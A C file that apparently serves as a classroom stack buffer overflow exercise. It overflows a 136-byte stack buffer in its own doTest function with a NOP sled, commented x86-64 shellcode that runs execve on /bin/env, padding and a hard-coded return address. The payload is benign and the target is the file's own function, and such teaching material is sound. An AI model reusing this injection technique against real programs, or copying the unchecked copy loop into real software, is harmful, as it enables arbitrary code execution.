#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void doTest();

int main(int argc, char * argv[]){

    putenv("MD5=8b7588b30498654be2626aac62ef37a3");

    /* call the vulnerable function */
    doTest();

    exit(0);
}

// VAriable to contain hex bytes of shell code
char compromise[159] = {
    
    // NOPs  adjust for any offset to make array of 159
    // the return address to in the stack.
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,
    // Begin execution and find the current position in memory

    // Clear the rax register to avoid NULL bytes
    0x48, 0x31, 0xC0,             // xor rax, rax
    0x48, 0x31, 0xFF,             //  xor rdi, rdi
    0x48, 0x31, 0xF6,              // xor rsi, rsi
    0x48, 0x31, 0xD2,              // xor rdx, rdx

    0x50,                          // push rax

    0x48, 0xBF, 0x2F, 0x62, 0x69,
    0x6E, 0x2F, 0x65, 0x6E, 0x76,       //mov rdi, 0x766e762f6e69622f ; "/bin/env" in reverse (little endian)

    0x57,                          // push rdi

     //; Set rdi to point to the "/bin/env" string
    0x48, 0x89, 0xE7,                // mov rdi, rsp

    0x50,                          // push rax
    0x57,                          // push rdi

    0x48, 0x89, 0xE6,                     // mov rsi, rsp


    0x48, 0x31, 0xD2,                      // xor rdx, rdx
    
    // ; Load 0x7fff into the low 16 bits of the rdx register (dx)
    0x66, 0xBA, 0xFF, 0x7F,                  //  mov dx, 0x7fff
    // ; Left shift the rdx register by 32 bits
    0x48, 0xC1, 0xE2, 0x20,                   // shl rdx, 32
    
    // ; Load 0xf7fbe6ff into the low 32 bits of rcx (ecx, this also clears the rest of rcx)
    0xB9, 0xFF, 0xE6, 0xFB, 0xF7,                //  mov ecx, 0xf7fbe6ff

    // ; Clear the low 8 bits of the rcx register (cl) without introducing null character
    0x48, 0xC1, 0xE9, 0x08,                    // shr rcx, 8  ; Shift right by 8 bits to bring back the original upper bits
    0x48, 0xC1, 0xE1, 0x08,                   // shl rcx, 8  ; Shift left by 8 bits, which clears the low 8 bits

    // ; Combine the registers using the OR instruction
    0x48, 0x09, 0xCA,                     // or rdx, rcx

    // ; Load the rdx register with the memory pointed to by the rdx register
    0x48, 0x8B, 0x12,                      // mov rdx, [rdx]
    //0xff,0xff,0xff,
   
    // ; Setup for execve system call
    0x48, 0x31, 0xC0,                   //   xor rax, rax       ; Clear rax to ensure no higher bits are set
    0xB0, 0x3B,                       // mov al, 0x3B       ; 0x3B is the syscall number for execve in x86-64

    // ; At this point, make sure rdi, rsi, and rdx are set up appropriately for execve
    0x0F, 0x05,                        // syscall            ; Perform the execve syscall

    // ; Setup for exit system call
    0x48, 0x89, 0xC7,                     // mov rdi, rax       ; Move the return code from execve to rdi
    0x48, 0x31, 0xC0,                     // xor rax, rax       ; Clear rax to ensure no higher bits are set
    0xB0, 0x3C,                       // mov al, 0x3C       ; 0x3C is the syscall number for exit in x86-64
    0x0F, 0x05,                       // syscall            ; Perform the exit syscall

    // padding
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,


    // return address rsp - 152 = 0x7fffffffdff0
    0xf0,0xdf,0xff,0xff,
    0xff,0x7f,0x00, 

};




// string variable to probe the stack and find the correct
// values for the shell code.

// 0x7ffff7fbe600 <environ>
// 152 chars to Z
char * compromise1 =
    "xxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "MNOPWXYZ" //in little endian hex 0x5a595857504f4e4d
    "xxxxxxxx"; // size 160 since char[161]



int i;

void doTest(){
    char buffer[136];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */
    for (i = 0; compromise[i]; i++){
	buffer[i] = compromise[i];
    }
}

